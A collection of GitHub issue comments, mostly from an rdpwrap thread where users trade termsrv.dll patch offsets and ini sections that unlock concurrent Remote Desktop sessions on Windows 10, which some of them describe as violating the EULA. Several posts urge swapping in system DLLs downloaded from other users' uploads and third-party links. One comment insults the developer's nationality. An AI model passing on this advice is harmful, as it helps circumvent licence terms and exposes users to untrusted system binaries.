phpstan/phpstan/1856/458520998,"Btw I already do comprehensive release notes for each release so if you’re interested in what’s new (that’s a use case!), I’ve got you covered. On Tue, 29 Jan 2019 at 1322, Ondřej Mirtes ondrej@friend.cz wrote -- Ondřej Mirtes ",,False,False,1856
phpstan/phpstan/1856/458522032,"If you cannot (or will not) attempt to understand me, I suppose there's nothing we can do. Too bad, because @friend seems to have understood perfectly. The last time someone told me to ""just run it"", with regards to software, was when I received a virus on ICQ circa 200x. Nowadays I prefer to know what I'm running. ",,False,False,1856
phpstan/phpstan/1856/458523221,"PHPStan is open-source. You have the option to learn what you’re running. There’s very readable rules configuration and a test suite that you can use for this purpose. And of course source code itself. You can even contribute the documentation you’d like to see present. Since I already took out portion of my day to reply to you, and I don’t like when my software is compared to a virus, I’m locking this conversation. Thanks for understanding. On Tue, 29 Jan 2019 at 1328, Bilge notifications@friend.com wrote -- Ondřej Mirtes ",,False,False,1856
phpstan/phpstan/1856/458523676,I also invited you to brainstorm ideas how the documentation should look so I’m very sad it ended in this non-constructive way. ,,False,False,1856
rabbitmq-website/rabbitmq/559/342202798," Doesn't look too good to me on an open source project page 😔. Also the TrustArc/Truste popup is really annoying and slow. Is it necessary as this site provides nothing that's under the ""Functionality NOT Allowed"" right?  ",,False,False,559
rabbitmq-website/rabbitmq/559/405904797,"There is NO advertising on this site, go dive into the source. Besides Google Analytics and Twitter, and perhaps YouTube embeds on the home page there are no trackers involved. We are required to use TrustArc by our corporate sponsor. We are looking at alternatives (there is no ETA) or at least a separate instance that does not contact 300 services of which we only use 2 or 3. ",,False,False,559
rabbitmq-website/rabbitmq/559/405906532,"Those who absolutely don't want TrustArc or any trackers have the option of running a local instance of the site. See the README, it is straightforward. Once you have a local copy running, remove Google Analytics, TrustArc and Twitter from the layout. ",,False,False,559
rabbitmq-website/rabbitmq/559/410097502,FTR we've switched to a new instance of TrustArc that only contacts the services we use. Our testing suggests that moving to Required Only cookies now takes about 2-4 seconds now as opposed to over 2 minutes when this issue was filed. ,,False,False,559
rdpwrap/stascorp/606/445476315,"Well,  it does work on the latest CU update to Win10., I am only allowed one connection at a time. When I log on other users get kicked off I am using Win10 Pro 64 Bit. ",,False,False,606
rdpwrap/stascorp/606/445481228,"Just tested this again !! IS WORKING !!  I can use one and more (Multi) Connection without kicked out. My Testbed is VM-host (win10x64pro) and the Client In VM is Win10x64Home. Fast test was done with RDPCheck.exe and RDPConf.exe to Show „single user session“ not checked !R Regards Von quicken2k Gesendet Samstag, 8. Dezember 2018 1838 An stascorp/rdpwrap Cc hajubu; Comment Betreff Re [stascorp/rdpwrap] Looking for 10.0.17763.168 support (#606) Well, it does work on the latest CU update to Win10., I am only allowed one connection at a time. When I log on other users get kicked off I am using Win10 Pro 64 Bit. — You are receiving this because you commented. Reply to this email directly, view it on GitHub, or mute the thread. ",,False,False,606
rdpwrap/stascorp/606/445492105,Good day. I installed 17763.168. And it all stopped working. Please tell me in detail what needs to be done to make it work again?  ,,False,False,606
rdpwrap/stascorp/606/445492722,17763.168 was installed now I also have stopped working LOL version 1809 was working so goo until now ,,False,False,606
rdpwrap/stascorp/606/445493640,"hey haijubu, I followed the steps in #601 and I did the ♠net stop TermService net start TermService` and after that I did a reboot but this is what I get  and I'm unable to connect via RDP to my server. Right now I'm connected via TermViewer and this is what I tried  It's still the same and I'm unable to connect. I have Windows 10 Enterprise installed with legit license I tried starting it manually from services and this is what I get  Any help would be appreciated. I only want multiple people to be able to connect using RDP at the same time, that is all Thanks ",,False,False,606
rdpwrap/stascorp/606/445495000,Update Little modification and this is where I stand now  I had to restart manually but still no luck I also added 3389 to firewall rules. Both UDP and TCP for both incoming and outgoing just in case it might help. Still no luck ,,False,False,606
rdpwrap/stascorp/606/445507620,"Once you install December 5, 2018—KB4469342 (OS Build 17763.168) CU update it limits the termserv.dll to one connection at a time, I  did have a backup of termsrv.dll, replaced it, and now it is working again. Just a heads-up in case anyone else runs into the issue. ",,False,False,606
rdpwrap/stascorp/606/445522418,I managed to do. I took the file from this post  it at home. And I added lines from the same post to my rdpwrap.ini file.  ,,False,False,606
rdpwrap/stascorp/606/445557111,I think I understand just copy and Paste 10.0.17763.1 data for .165 and a .168 correct? Dumb Question why doesn't the RDPWrap-V1.62 update.bat do this for us? ,,False,False,606
rdpwrap/stascorp/606/445536091,"Hello Team, I did a full  recheck for all version/builds 17763.1,.165,.167, .168   // last CU KB4469342 (v168.1.10 ) and SSU KB4470788 both from 2018-12-04 // msuSSU must be installed before CU , only the 'older' KB4469342 (cab) should/(must) be overwritten. I also installed KB4471331(adobe flash) and  KB 4469041 -preview CU upd NetFramew.3.5/4.72) which I believe not so important // 2 TestBeds)  host x64pro and client x64 (Pro AND Home)  __ !! ARE WORKING  in both direction !!    i.e. local RDPcfg ,RDPchk and ""life"" from 17763.168 and to VM-Client-17763.165,.167,.168        AND a real x64pro-PC to  a x64Home-PC      Look at #601 - hajubu posts (2018-11-21, -22 build .165, 18-12-07 and -08 -------2018-11-21------------ Something has changed from 17763.1 (incl .55, .107 and .134) to 17763.165 in the x64-data [10.0.17763.165]  // LocalOnlyOffset.x64=xxxxx  //xxxxx.(17763.1) =77941 ♢ xxxxx.(17763.165) =77AF1 ( tested and validated ) all other x64-ini-data for 1809rs517763.1 to .134 are the same as .165-data hint SingleUserOffset.x64=132F9 may be also ==1322C as in the original-ini from 2018-10-10 -------2018-11-22------------- 1) ;--------snip-----from here  ...  [10.0.17763.165] ...to... ;--------snip------------- 2) ;--------snip-----from here  ...  [10.0.17763.165SL-Init] ...to... ;--------snip------------- 3) read the snip ;------------------------use as batch / cmd ------------------------- or save it to a txt.file 4) termsrv.dll was meanwhile updated to .167(18-11-27) and .168(18-12-04),  offsets seems to be the same as in .165. Therefore (if you have a need for it ) just change the ini header for the ""new"" build or ................ Add for each build a section for [10.0.17763.nnn] and [10.0.17763.nnn-SLInit] with the data (in #601 -hajubu)  using the snipping data [10.0.17763.165] and [10.0.17763.165-SLInit]. ------2018-12-08---------- Additional Remarks given another team member For each build , you need the two ini-Section [10.0.17763.nnn] and [10.0.17763.nnn-SLInit] / nnn= (1 , 165, 167, 168 ) is given, which contains both (.x64 and .x86) offset-values. This ensures that all these builds will be recognized. I did a replication of my findings (snip-listing Sections [10.0.17763.165] and [10.0.17763.165-SLInit] above) for all three 177763.nnn-builds (165,167,168), adding these section by taking the original build from 2018-10-10 from the repository,containing already the both 177763.1 Sections( with 64 and x86)  whereby the build-number were set according to the wanted build. (! There is a main difference from build 17763.1 to 17763.165). For better reading (and -may be- for the init of rdp-wrapper )                       I did put each section for itself  behind 17763.1 and  behind 17763.1-Slinit. Please be aware not stumbling over a) os-bit version b) not using ""net stop TermService"" and changing the ""newly"" edited ini-file. See my comment for a risk of overwriting this file using unmodified ""install.bat/uninstall.bat"" or the ""update.bat"" . batch/cmd in 3) and it might be a good idea  to change in the [Main] section the Updated=yyyy-mm-dd  to your ""year-month-day"" figures e.g. 2018-12-09 c) after you have replaced the ini-file do restart the ""PC"" or at least use ""start net TermService"".   Stopping and starting may have another trips/tripping , restart the system can be a better idea. Remark Each build 17763.1 , .165 , 167 , 168 comes with an own ""build"" version of Termsrv.dll ( x64,x86). The rfxvmt.dll (x64 , x86 ) has always 17763.1, whereby the the added (older) rfxvmt.dll in syswow64 from the rdp-wrapper install also still works fine. Therefore in x64 you have several choices to circumvent the stumbling stones. Please let me know if this helped. Getting the Termsrv.dll and rfxvmt.dll from the dedicated install.wim (x64 / x86) or do a simple VM install of the OS-build of your choice ( my recommendation) and follow up the workflow, Exchanging a  ""dll""  in a system you have to have special rights as you know already for sure.  ",,False,False,606
rdpwrap/stascorp/606/445559699,"@friend wrote …. I think I understand just copy and Paste 10.0.17763.1 data for .165 and a .168 correct? &gt;&gt;&gt; NO  … why doesn't the RDPWrap-V1.62 update.bat do this for us?         &gt;&gt;&gt;  RDP-Wrapper repository (                 rdpwrap.ini  Is still on Updated=2018-10-10 and                 contains only  the ini-sections for  Win10 1809 RTM                                 [10.0.17763.1]   and [10.0.17763.1-SLInit]  REMARK ; I'm pretty sure that it will be updated as soon $MS-Tuesday in Decmeber18 works fine out. From 17763.1 to 17763.165 are Offset-Differences [10.0.17763.165] // LocalOnlyOffset.x64=xxxxx //xxxxx.(17763.1) =77941 ♢ xxxxx.(17763.165) =77AF1 // ( tested and validated ) For each build , you need the two ini-Section [10.0.17763.nnn] and [10.0.17763.nnn-SLInit] / nnn= (1 , 165, 167, 168 ) is given, which contains both (.x64 and .x86) offset-values. Contains the SAME Data (except the Header inside the square-brackets)     1)        Paste and copy from my post in #601 -hajubu - 2018-11-22                  [10.0.17763.165] and [10.0.17763.165-SLInit]     2)         Replicate copy of data in .165 to new ini section inside each Header to           [10.0.17763.167] and [10.0.17763.167-SLInit]     3)         Replicate copy of data in .165 to new ini section inside each Header to           [10.0.17763.168] and [10.0.17763.168-SLInit] Iinfo from build .1 up to .134 Data for 10.0.17763.1 are the same (.1) And from 1.65 up to .168 are the same  But the termserv.dll build have different internal build numbers -&gt; own numbered data sections    Please be aware not tripping over „Windows OS stumbling Stones“   data ownership // security Levels // etc   Read my remarks  for using stopping and starting net termservice  • Good Luck ",,False,False,606
rdpwrap/stascorp/606/445561798,"@friend, @friend @friend , @friend, @friend , @friend, @friend  I wrote down the exact steps I did in (#601). This works fine for 10.17763.168. I think this is the most comprehensive way to understand what to get it working. Thanks to @friend and @friend 👍 🥇 ",,False,False,606
rdpwrap/stascorp/606/446676805,Can someone upload the working dll and ini files here? ,,False,False,606
rdpwrap/stascorp/606/445575362,"Andre wrote  @friend, @friend @friend , @friend, @friend , @friend, @friend  I wrote down the exact steps I did in (#601). This works fine for 10.17763.168. I think this is the most comprehensive way to understand what to get it working. Thanks to @friend and @friend 👍 🥇 Hello Team, I just want to add that we do have still an open point to be cleared. This open point  could have a ""hidden"" influence to the ""single user session"" - function ( even I could not see/find/obeserve a wrong/not exspected reaction up til now in my Testbed. I do prefer the logical position of the SingleUserOffset  according to  the ""official"" rdpwrap.ini Release (2018-10-10)  up till now  ( 17134.1 , 17763.1 ) 17134.1 == ; SingleUserOffset.x64=1511C  17763.1 == ; SingleUserOffset.x64=1322C UNTIL WE KNOW BETTER. b.r. Hajubu ;--------------------------------------------- ;This logical  position was already used in 17134.1  IN rdpwrap.ini UNTIL 2018-10-10 ; SingleUserPatch.x64=1 ;.text0000000180015100 ; int64 fastcall CSessionArbitrationHelperMgrIsSingleSessionPerUserEnabled(…) ;.text0000000180015119    mov     dword ptr [rax+8], 1    dword ptr  [rax+8],1 &lt;--Zero  ; SingleUserOffset.x64=1511C ;--------------------------------------------- ;--------------------------------------------- ;  --  first seen ;  --  Github StasCorp/Code/res ;  --  original rdpwrap ini 2018-10-10 ;. --  17763.1  ; validated .1 up to .134 and .165,.167 ,.168 ; SingleUserPatch.x64=1 ;.text0000000180013210 ; int64 fastcall CSessionArbitrationHelperMgrIsSingleSessionPerUserEnabled(...) ;.text0000000180013229    mov     dword ptr [rax+8], 1  &lt;-- Zero   C7 08 '01' 00 00 00  ; SingleUserOffset.x64=1322C ;--------------------------------------------- ;--------------------------------------------- ;  --  first seen --  Github StasCorp/rdpWrap ;  --  #601 @friend 2018-11-16 ;  --  and furthermore in myDigitalLife Forum -- ;  --  17763.165 - 168 ; SingleUserPatch.x64=1 ;.text00000001800132E0 ; int64 fastcall CSessionArbitrationHelperIsSingleSessionPerUserEnabled() ;.text00000001800132F7    mov     dword ptr [rdx], 1 &lt;-- Zero  C7 02 '01' 00 00 00  ; SingleUserOffset.x64=132F9 ;--------------------------------------------- ",,False,False,606
rdpwrap/stascorp/606/446684949,"@ Tom wrote ( Tom Forever)  Just read #611 for the actual data needed ; you should Need Nothing else.  10.0.17763.194 - CU KB4471332 - keeps/lifts the termsrv.dll to its file version 10.0.17763.168. Therefore since .165, .167, .168 use the data-offset, which are the same, we have to add to the rdpwrap.ini dated 2018-10-10 ( last.ini in the repository - code res\rdpwrap,ini). Ensure you have the correct ini file with two ini-sections [10.0.17763.1] , [10.0.17763.1-SLInit] and add then the two sections [10.0.17763.168], [17763.168-SLInit] Keep an eye on Acces Rigths and at least use ""stop net termservice"" before you exchange the rdpwrap.ini (2018-10-10) with your newly edited ini file. ---read more in #611 Or  If is to keen just wait  till the updated „official“ and validated Version of rdpwrap.ini will be  given into the repository (Code res\rdpwrap.ini) then you can just push the button after you have updated your OS to Version 10.0.17763.194 (-.1.5). My recommendation is just do your Job in a VM/VBox  with the last ISO e.g. even the RTM 17763.1 will do it for any purpose , you want (x64,x86 – Home, Pro, etc). Then you can pick up what you ever need for your purpose. .Good Luck Von Tom Gesendet Mittwoch, 12. Dezember 2018 1841 An stascorp/rdpwrap Cc hajubu; Mention Can someone upload the working dll and ini files here? ",,False,False,606
rdpwrap/stascorp/606/447677783,I edited rdpwrap.ini edit for 17763.168 pursuant to #611. Works excellent for me. Thanks for making my life easier. ,,False,False,606
rdpwrap/stascorp/606/448430150,"This is very very much, not a dumb question, at all. I'd love to know myself to be honest. ",,False,False,606
rdpwrap/stascorp/606/448450689,I attempted the warezio ini file linked here  has resulted in my machine being no longer accessible. Recommend others avoid for time being until this is fixed. I have also moved my Windows 10 on to the 'slower' release channel for updates. ,,False,False,606
rdpwrap/stascorp/606/448495576,"LOL, I like your post. But it is not correct. Only the -SLInit sections are (at least for versions till 194) are equal. The [10.17763.xxx] sections are different for each version. ",,False,False,606
rdpwrap/stascorp/606/448503154,"Regardless, end users just want to hit ""update.bat"" in Admin mode and have it work a minute or two later, you know? ",,False,False,606
rdpwrap/stascorp/606/448531020,"@friend  wrote  Regardless, end users just want to hit ""update.bat"" in Admin mode and have it work a minute or two later, you know? … up till now there is no „automatic“ solution Ready for „update.bat“- Button Meanwhile  you can use a manually Job see last post of vibaaa in #611 he had managed it too He added also his tested rdpwrap.ini – using the official data from the repo and added the necessary data section. @ andrePKI also had given a very short „cooking recipee“ how doing the Exchange of the rdpwrap.ini. BTW – I’m just an user like you ! Good Luck ! ",,False,False,606
rdpwrap/stascorp/606/448832138,"I have tried number of ways from other threads, finally I came up a simple and workable solution for both x32 and x64 edition.  First, install rdpwrap v1.62  to Administrative command prompt, then run ""net stop termservice"" Replace rdpwrap.ini attached (It supports both x32 and x64) Go to Administrative command prompt, then run ""net start termservice"" Finally, go to C\Program Files\RDP Wrapper folder, run RDPConf to check the states Make sure All states are green Congrats! You should now be able to RDP to your desktop.  If Listener state is not green, please do the following-  Go to Administrative command prompt, then run ""net stop termservice"" Replace termsrv.dll and rfxvmt.dll in c\windows\system32 (Please download the correct OS version) Repeat Step 4 to 6 above.  Hope this helps. rfxvmt_32bit.zip rfxvmt_64bit.zip termsrv_x32.zip termsrv_x64.zip rdpwrap.zip  ",,False,False,606
rdpwrap/stascorp/606/448836025,The original developer of this project is a lazy Russian asshole I swear. ,,False,False,606
rdpwrap/stascorp/606/448858167,"I like the instructions you provided @friend , but I advise against replacing any Windows components. It's much better to find out why what is on the machine does not work. View properties of termsrv.dll, get the version, and make sure that section is present in the ini file. Again, I like the instructions. ",,False,False,606
rdpwrap/stascorp/606/448933773,"I think most of the people like me just want to fix the issue and get it work again. I'd leave this to someone who is really interested in finding the root cause. BTW, those two files termsrv.dll and rfxvmt.dll are extracted from Build 10.0.17763.194. x32 and x64. Thanks ",,False,False,606
rdpwrap/stascorp/606/449626122,"Anything above worked for me. Need an effective solution, please ",,False,False,606
rdpwrap/stascorp/606/449664769,"This would be great if we had an official fix that work out of the box instead of zillions uncomprehensible, confusing, contradictory and incomplete instructions here and in other issues that may or may not work... I know this just does not happen magically so thanks in advance to whoever maintains this program. ",,False,False,606
rdpwrap/stascorp/606/449716999,"Like many others, I was also having issues getting RDPWrap to work after updating my Windows 10 install to 10.0.17763.195. I had tried literally everything recommended in this issue and/or referenced in others to no avail. However, I was surprised to find the following commands worked for me and it is now running fine. rdpwinst.exe -u rdpwinst.exe -i I am not sure why these two commands fixed it for me as I had uninstalled / reinstalled using the bat files numerous times. Just thought I'd share in case this could potentially help someone else. ",,False,False,606
rdpwrap/stascorp/606/449912350,"Link But maybe it doesn't work fine for me. My OSversion is Win10 Home 17763.195. Operating as the instuction, I met a problem on step 4, part 1. After I started termservice via , it shut immediately. I don't know what's wrong. Is there any other solution? BTW, I've test it on both of my two computers with the same OS version. It worked nowhere. ",,False,False,606
rdpwrap/stascorp/606/450068614,"Finally I figured it out for 195. You don't need to dlls, just the .ini file. HOWEVER, there is a small issue with the ini file provided by explorerhk. You need to add a newline (the enter key) at the end of the file!!! Just then follow explorerhk's instructions and it will work! (at least on Windows 10 pro) ",,False,False,606
rdpwrap/stascorp/606/450008401,I can confirm issues with the provided .ini I have a PC WIN10 pro 17763.195 working fine after updating .ini as described. Another PC with same OS Version is not working. RDP service crashes immediately after updateting .ini and restarting service. ,,False,False,606
rdpwrap/stascorp/606/450139129,"Hi, Been trying around, but so far no luck. Did manage to get ""Fully supported"", but listening state keeps saying ""Not listening"". Any idea's? ",,False,False,606
rdpwrap/stascorp/606/450221374,"Just got back from holiday, thank you for finding the root cause. I made a little bit clean up of my original ini   file before uploading to GitHub, that's why I didn't realize the issue. I have uploaded the new ini file to my original reply again, hope this helps. ",,False,False,606
rdpwrap/stascorp/606/450211172,Working fix The problem was with the line endings (LF instead of CRLF) rather than a missing newline. Here is the fixed  file (from #612) to put into  need to restart the service (or windows) for it to take effect ,,False,False,606
rdpwrap/stascorp/606/450164458,"@friend Thanks a lot. The modified .ini is working for me (new line - ENTER at the end)!  By the way, it is a little bit confusing that a non modified .ini is working for another PC with WIN 2010 pro, too. But I am not worried about that, because it is working on all of my PCs now. ",,False,False,606
rdpwrap/stascorp/606/450232573,@friend  tried your files and Listener State is still NOT LISTENING followed these steps  net stop termservice replaced termsrv.dll and rfxvmt.dll  installed rdpwrap replaced rdp.ini net start termservice reboot  win x64 pro 10.0.17763.195  ,,False,False,606
rdpwrap/stascorp/606/450251184,"@friend, you should not be replacing or modifying any windows components when rdpwrap is used. You should only use what Microsoft put on your machine. ",,False,False,606
rdpwrap/stascorp/606/450318167,But the recomendation not worked for version 10.0.17763.168 ( ,,False,False,606
rdpwrap/stascorp/606/450315662,"Hi Everyone, I have tried with this .ini file and it worked for me, it's for 10.0.17763.167 version x64 rdpwrap.zip  ",,False,False,606
rdpwrap/stascorp/606/450263332,"You may need to revert the DLLs back to the original. I found that the dll from rfxvmt_64bit.zip is a different size compared to the original.  Then just follow @friend's instructions with the fixed ini file  First, install rdpwrap v1.62  to Administrative command prompt, then run ""net stop termservice"" Replace rdpwrap.ini in C\Program Files\RDP Wrapper (The new file supports both x32 and x64) Go to Administrative command prompt, then run ""net start termservice"" Finally, go to C\Program Files\RDP Wrapper folder, run RDPConf to check the states Make sure All states are green Congrats! You should now be able to RDP to your desktop.  ",,False,False,606
rdpwrap/stascorp/606/450352262,"Hello, I have the same problem see message from smiler999 ",,False,False,606
rdpwrap/stascorp/606/450382137,"I'm new to RDPWrap &amp; Github so please forgive me for not understanding protocol here, but I don't understand something.... This program appears dead, as there has been no official support since it ""broke"" last month, yet the author (binarymaster) continues to stop by time to time to ""close"" issues that are very obviously still open. So if this program has been abandoned, why bother to come and close the issues? If it has not been abandoned, why not at least a comment saying ""I am working on it""? Please clarify, thanks! ",,False,False,606
rdpwrap/stascorp/606/450382913,"I just wanted to confirm that this is working on my fully updated system.  The fixed ini file is all that is needed.  I couldn't get it working since I was trying to used the modified dlls (so don't use those!) Luckily I backed up the original files before using the modified dlls. I will restate instructions for people on winver 10.0.17763.195 (10.0.17763.168 in RDPConf).  I am assuming you already have rdpwrap installed but it isn't working.  Download the fixed ini file in explorerhk's post above or here rdpwrap.zip  2.Extract the ini to your desktop.  Run cmd as Administrator  net stop termservice  Open Explorer and go to \Program Files\RDP Wrapper  Drag and drop the ini on the desktop in to RDP Wrapper\ and replace the file in the destination.  Assuming you have your original dlls in System32\  go back to the cmd window and net start termservice  Check RDPConf   I will upload my dlls here as well for anyone that already deleted them and don't have them in the Recycle Bin. termsrv.dll need TrustedInstaller to be owner, so make that change when you put it in System32\ I' dlls.zip m not sure what other permissions are necessary.  ",,False,False,606
rdpwrap/stascorp/606/450385077,"Probably closing them since people keep asking how to fix something that has already been addressed. Check out my post above if you are on the same version, it should work. ",,False,False,606
rdpwrap/stascorp/606/450420444,"ditchmagnet's post above resolved my issue, thanks bud ",,False,False,606
rdpwrap/stascorp/606/450427257,"@friend thanks a lot, works great again  10.0.17763.195 x64 pro ",,False,False,606
rdpwrap/stascorp/606/450663074,@friend - confirming a working solution; thank you.  10.0.17763.195 (10.0.17763.168) x64 PRO ,,False,False,606
rdpwrap/stascorp/606/450758695,"Now have RDPWrap working again.  However, cannot restrict to single user session despite the box checked.  Any suggestions to restrict to one session per user?  ",,False,False,606
rdpwrap/stascorp/606/450953033,I'm curious why this rdpwrap.ini doesn't get updated with the Update.bat ? ,,False,False,606
rdpwrap/stascorp/606/451194130,Because it is not updated in repository yet. ,,False,False,606
rdpwrap/stascorp/606/451322609,"Howcome though? There's now, definitely a good ini file out there, I got one from someone nearly a week ago and even then, a week ago, i thought it was late. ",,False,False,606
rdpwrap/stascorp/606/451335637,Err...perhaps the developer/maintainer is busy with life or is waiting to insure the proposed changes don't cause other issues. ,,False,False,606
rdpwrap/stascorp/606/451385206,"Not my project but I would suggest that Priority #1 should be to include any new termsrv offsets as soon as they allow concurrent sessions, even if there are side issues. Surely the Issues area would be better suited for users to report bugs with the newer offsets rather than being an experimental/discussion zone where we're explaining to n00bs over and over how to patch their own rdpwrap.ini. There's already an  update.bat script, but it's essentially useless if the ini file is years out of date. Having the rdpwrap.ini file in two places also causes confusion - at first I did not even know that RDPWrap installs itself to Program Files and that there is where the file should be updated. I propose that if we push the updated offsets to all users sooner, then we will have a bigger pool of users and developers to report on and resolve any bugs that arise, and the issues area could be focused on dealing with real bugs rather than duplicate ""latest build not working"" reports and manual patching tutorials.. /2c ",,False,False,606
rdpwrap/stascorp/606/451420809,↑↑↑ This is the reason why I and many others do not publish hobby works. It ain't commercial project with a dedicated support team. Be thankful for whatever service is provided by (likely) one dude in his/her spare time. ,,False,False,606
rdpwrap/stascorp/606/451422653,"Uh, no. As someone who actually publishes open-source software I can say that there is abuse on both sides. On the one hand you have people demanding something for nothing. On the other hand you have people hiding behind terrible projects with ""it's free so be happy for what you get"". The latter is just as bullshit as the former. Stop polluting the internet with broken-ass projects. This noise prevents others from stepping in with better solutions because they think someone else is already handling it. In this particular case, it would take the author all of 10 seconds to post ""I am aware of this issue. Thank you for your contributions. I will be release an update in the near future."" For those of you wanting to see a quicker resolution to this issue, I suggest publishing a Pull Request such as  Then the author just needs one minute to review, click a button, and release an update. ",,False,False,606
rdpwrap/stascorp/606/451424122,Lol - presumed entitlement is a beautiful thing. Good suggestion on the pull request. ,,False,False,606
rdpwrap/stascorp/606/451699268,"Hey, i am new to rdp. I hope someone can help me. My RDP Check looks good but i can`t open    I got an Error that says The computer was unable to connect to another console session on the remote computer because a console session is already active. ",,False,False,606
rdpwrap/stascorp/606/451699611,"Tick the check box ""single session per user"" ",,False,False,606
rdpwrap/stascorp/606/451699963,The same . Restartet and no change  With RDP Checker it works but not with mstsc.exe ,,False,False,606
rdpwrap/stascorp/606/451700893,Yes. with RDPcheck.exe i can open more.  ,,False,False,606
rdpwrap/stascorp/606/451701282,The screenshot shows a RDP to local host. Initiate RDP by another PC. ,,False,False,606
rdpwrap/stascorp/606/451701899,From Tablet it works. can i open rdp from local too? ,,False,False,606
rdpwrap/stascorp/606/451702432,OS prevents RDP to local host. I know there are some work arounds for XP (e.g. changing standard port for RDP). But I do not know if there are work arounds for Win 10 as well. I have no need for local RDP. ,,False,False,606
rdpwrap/stascorp/606/451704231,I just found a solution. Used 127.0.0.2 to rdp local ,,False,False,606
rdpwrap/stascorp/606/451835245,"I can't echo the sentiments of this post any more! I'm in exactly the same boat, I always thought RDPWrap was running standalone?!  My ""copy"" is in c!tools\RDPWrap. NO idea it wrote elsewhere, infact I posted on these forums ""what INI file?"" I didn't know it had one. The highest priority should be updating the INI file.    I know, without question that there's an INI file ""out there"" 100% compatible with 168, because I got it nearly 2 weeks ago and it fixed me up. I've set my Windows Update Channel to be slightly slower (as they allow anyhow, only 2 options now?) and hopefully next time this happens, I won't be in the list of bleeding edge users who get done by this - it'll be fixed by the time I'm upgraded. HOWEVER a big bonus SCREW YOU to Microsoft, who never used to ""mess with"" the termserv.dll file back in the old days? Under Windows 7 I don't recall this being ruined / wrecked at all.  Why is it suddenly dying constanmtly under Windows 10? Appreciate the good work but we need to work on a solution which makes this program up to date within I dunno, a week ?   I don't know if we are STILL having users posting ""HELP, it's not working - but we need to fix that. ",,False,False,606
rdpwrap/stascorp/606/452187104,the solution in issue #611 worked perfectly for my system. ,,False,False,606
rdpwrap/stascorp/606/453073288,Developer/maintainer doesn't publish a schedule. Check back for updates. ,,False,False,606
rdpwrap/stascorp/606/453095510,"I have tried this and failed so many times now - I don't know what to do next. I had RDPWrap working for release 1803 with no problems. Updating it for 1809 I can't get it to work. I have tried everything in threads 601, 606 and 611. I have Win10 x64 Home v1809. I used the ini file from the other threads, which people say works rdpwrap.zip I start with it uninstalled.  From an elevated command prompt I run RDPWInst -i -o. Then I ran RDPWInst -w  I did net stop termservice (it wasn't running so did nothing) I replaced the C\Program Files\RDP Wrapper\rdpwrap.ini with the one above. I then started the termservice again net start termservice  It stayed in a state of ""starting"".  I rebooted. The service was still permanently in a state of ""starting""   The only way I can stop it is going into the Task Manager, finding the process and killing it. Nothing obvious in the Event Viewer. I don't understand why I'm finding it so difficult when others aren't and previously I had it working. Can anyone help or have any suggestions?  ",,False,False,606
rdpwrap/stascorp/606/453206834,"@friend Chris, first find the version of your termsrv.dll (it is in , rightclick it from Explorer)  Next, go to the directory where you installed RDPWrapper (By default it is in ). Check if the INI files does contain the two sections for your version (.168 in my case)♠[10.0.17763.168] [10.0.17763.168-SLInit]C\Program Files\RDP Wrapper`. If you made any changes, restart the service. Note that most of things you do require you to do it as Administrator (or click Yes in the User Account Countrol popup window, if any) ",,False,False,606
rdpwrap/stascorp/606/453211508,"@friend  sure why you blame Microsoft? They are free to modify their own software at will ;-) Multiple RDP sessions into a Windows10 workstation is not a supported Microsoft scenario. Hence to us it is a matter of keeping up with the changes. Basically it is nothing more than a workaround or hack, and I would not be surprised if it is against the Windows EULA. The fact that so many users find issues in W10 and not W7 is that W7 is more or less stable at this point, whereas W10 is (especially in the preview fast and slow rings) constant improvement. Also I have seen people picking on and even being very rude to the IMHO very clever guy who made this software @friend. A BIG THANK YOU for Stanislav! ",,False,False,606
rdpwrap/stascorp/606/453219620,"Works for me. Try to add this to c\Program Files\RDP Wrapper\rdpwrap.ini  Last line MUST be empty Dont forget to ""rdpwinst -r"" ;) ",,False,False,606
rdpwrap/stascorp/606/453312719,"_&gt; &gt; I have tried this and failed so many times now - I don't know what to do next. I had RDPWrap working for release 1803 with no problems. Updating it for 1809 I can't get it to work. I have tried everything in threads 601, 606 and 611. _ Most others are using Win10 Pro vs Home. Quite possible additional tweaks will be needed to accomodate the latter. ",,False,False,606
rdpwrap/stascorp/606/453516622,"@friend Thanks for the suggestions.  Yes, my termsrv.dll matches yours (except the modified date, which you might expect)   Yes, my in file had those 2 sections, but the first had different offsets than @friend's post (despite others saying it worked for them). I replaced it with the sections from @friend 's post above making sure the last line is empty.  Restarted with RDPWrap -r (elevated cmd prompt) Service is still permanently ""starting"" and not listening. Aargh!  @friend - Yes I am doing it for Win10 Home but that's the point of it. I don't need it for my Win10 Pro machine because that already allows RDP for 1 session, which is all I need. I just need to be able to access my other 2 machines' desktops (1 Pro, 1 Home) from my main system without having to have a KVM switch. ",,False,False,606
rdpwrap/stascorp/606/453707979,@friend - no challenge on your use case; simply observing what works for most may not be applicable in your situation due to difference in platform. I the past I used rdpwrap on Win 10 Home boxes and appreciated the capability it brought to the table (in violation of the EULA). Good luck. ,,False,False,606
rdpwrap/stascorp/606/453752319,YES !!! THIS WORKS !!! PLEASE DO NOT FORGET TO WRITE-PROTECT YOUR rdpwrap.ini. Otherwise the tool will download new version that das not contain the needed additional marks like discribed here  newest version rdpwrap Install RDPwrap normaly Download newest rdpwrap.ini (  ) and place it into your rdpwrap install folder add this lines to your rdpwrap.ini   [10.0.17763.165] LocalOnlyPatch.x64=1 LocalOnlyOffset.x64=77941 LocalOnlyCode.x64=jmpshort SingleUserPatch.x64=1 SingleUserOffset.x64=132F9 SingleUserCode.x64=Zero DefPolicyPatch.x64=1 DefPolicyOffset.x64=17F45 DefPolicyCode.x64=CDefPolicy_Query_eax_rcx SLInitHook.x64=1 SLInitOffset.x64=1ABFC SLInitFunc.x64=New_CSLQuery_Initialize [10.0.17763.165-SLInit] bInitialized.x64 =ECAB0 bServerSku.x64 =ECAB4 lMaxUserSessions.x64 =ECAB8 bAppServerAllowed.x64 =ECAC0 bRemoteConnAllowed.x64=ECAC4 bMultimonAllowed.x64 =ECAC8 ulMaxDebugSessions.x64=ECACC bFUSEnabled.x64 =ECAD0  Download this termsrv (  ) replace safely yout termsrv.dll with this new downloaded one write proctect yout rdpwrap.ini in your install folder (that you downlooaded in step 3 and modified in step 4) start update.bat  THAT WORKS 100% on 10.0.17763.165 @friend Team Sdelajte etot malenkij update poshalusta ! Agromnoje spasibo sa vashu rabotu ! ,,False,False,606
